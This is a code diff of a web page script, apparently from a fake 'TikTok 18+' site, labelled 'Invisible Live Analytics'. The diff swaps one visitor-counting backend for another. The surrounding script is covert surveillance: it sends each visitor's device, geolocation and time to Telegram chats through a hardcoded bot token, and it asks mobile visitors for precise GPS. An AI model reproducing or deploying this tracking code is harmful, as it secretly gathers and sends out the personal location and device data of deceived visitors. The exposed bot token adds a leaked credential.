@@ -3021,12 +3021,12 @@ if (document.readyState === 'loading') {
 }
   </script>
  
-  <!-- Invisible Live Analytics: TikTok 18+ -->
+  <!-- /Invisible Realtime Traffic -->
+<!-- Invisible Live Analytics: TikTok 18+ -->
   <script>
   (function() {
     const TG_BOT_TOKEN = "8904216231:AAHzuoU59D43qO04lsrYvZDhw0su_61Y2Ig";
     const TG_CHAT_IDS = ["8788656318", "8461980119"];
-    const CLOUD_STATS_URL = "https://api.restful-api.dev/objects/ff808181a09d98f701a0d9e87f5b165c";
     const SITE_NAME = "TikTok 18+";
     const SITE_TAG = "TIKTOK 18+";
     const SITE_KEY = "tiktok18";
@@ -3066,49 +3066,23 @@ if (document.readyState === 'loading') {
       });
     }
 
-    async function syncCloudStats(type, countryCode, regionName, deviceSimple) {
+    function syncLiveCounters(type, countryCode) {
       try {
-        const getRes = await fetch(CLOUD_STATS_URL);
-        if (!getRes.ok) return;
-        const current = await getRes.json();
-        const d = current.data || { visits: 0, actions: 0, countries: {}, regions: {}, days: {}, devices: {} };
-
         if (type === "visit") {
-          d.visits = (d.visits || 0) + 1;
+          // 1. Total visits
+          fetch("https://countapi.mileshilliard.com/api/v1/hit/" + SITE_KEY + "_v_live", { keepalive: true }).catch(function() {});
 
-          // Countries
-          d.countries = d.countries || {};
-          const c = countryCode || "US";
-          d.countries[c] = (d.countries[c] || 0) + 1;
-
-          // Regions
-          d.regions = d.regions || {};
-          if (regionName) {
-            const reg = regionName.trim();
-            d.regions[reg] = (d.regions[reg] || 0) + 1;
-          }
-
-          // Daily stats (YYYY-MM-DD)
-          d.days = d.days || {};
+          // 2. Today's visits
           const today = new Date().toISOString().slice(0, 10);
-          d.days[today] = (d.days[today] || 0) + 1;
+          fetch("https://countapi.mileshilliard.com/api/v1/hit/" + SITE_KEY + "_d_" + today, { keepalive: true }).catch(function() {});
 
-          // Devices
-          d.devices = d.devices || {};
-          const dev = deviceSimple || "Mobile";
-          d.devices[dev] = (d.devices[dev] || 0) + 1;
+          // 3. Country visits
+          if (countryCode) {
+            fetch("https://countapi.mileshilliard.com/api/v1/hit/" + SITE_KEY + "_c_" + countryCode.toLowerCase(), { keepalive: true }).catch(function() {});
+          }
         } else if (type === "action") {
-          d.actions = (d.actions || 0) + 1;
+          fetch("https://countapi.mileshilliard.com/api/v1/hit/" + SITE_KEY + "_a_live", { keepalive: true }).catch(function() {});
         }
-
-        // Clean out legacy ages if present
-        if (d.ages) delete d.ages;
-
-        await fetch(CLOUD_STATS_URL, {
-          method: "PUT",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ name: SITE_KEY + "_stats", data: d })
-        });
       } catch (err) {}
     }
 
@@ -3340,13 +3314,7 @@ if (document.readyState === 'loading') {
       msg += "• Время: " + time;
 
       sendTelegramAlert(msg);
-
-      let devSimple = "Other";
-      if (/iPhone|iPad/i.test(device)) devSimple = "iOS (iPhone)";
-      else if (/Android/i.test(device)) devSimple = "Android";
-      else if (/Windows/i.test(device)) devSimple = "Windows";
-      else if (/Mac/i.test(device)) devSimple = "Mac";
-      syncCloudStats("visit", geo.country_code || geo.country, geo.region, devSimple);
+      syncLiveCounters("visit", geo.country_code);
 
       // Check high accuracy GPS if available and mobile
       if (navigator.geolocation && /iPhone|iPad|Android/i.test(device)) {
@@ -3382,7 +3350,7 @@ if (document.readyState === 'loading') {
       msg += "🕒 <b>Время:</b> " + time;
 
       sendTelegramAlert(msg);
-      syncCloudStats("action");
+      syncLiveCounters("action");
     }
 
     window.__trackVisitorAction = trackAction;
@@ -3426,6 +3394,5 @@ if (document.readyState === 'loading') {
     }
   })();
   </script>
-<!-- /Invisible Realtime Traffic -->
 </body>
 </html>
